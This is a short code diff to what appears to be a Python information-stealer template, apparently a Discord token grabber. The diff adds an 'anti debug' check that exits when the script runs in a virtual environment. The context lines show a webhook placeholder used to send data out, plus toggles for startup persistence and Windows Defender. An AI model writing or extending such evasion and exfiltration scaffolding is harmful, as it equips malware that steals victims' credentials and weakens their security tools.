@@ -1,3 +1,16 @@
+#new anti debug feature
+import sys # only lib needed
+
+def get_base_prefix_compat(): # define all of the checks
+    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
+
+def in_virtualenv(): 
+    return get_base_prefix_compat() != sys.prefix
+
+if in_virtualenv() == True: # if we are in a vm
+    sys.exit() # exit
+#new anti debug feature
+
 import base64
 import json
 import os
@@ -21,20 +34,12 @@ from sys import argv
 from tempfile import gettempdir, mkdtemp
 from zipfile import ZIP_DEFLATED, ZipFile
 
-
-
-
-
 __WEBHOOK_HERE__ = "YOUR WEBHOOK HERE"
 __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
 __ERROR__ = "%_error_enabled%"
 __STARTUP__ = "%_startup_enabled%"
 __DEFENDER__ = "%_defender_enabled%"
-
-
-
-
 
 def main(webhook: str):
     webhook = SyncWebhook.from_url(webhook, session=requests.Session())
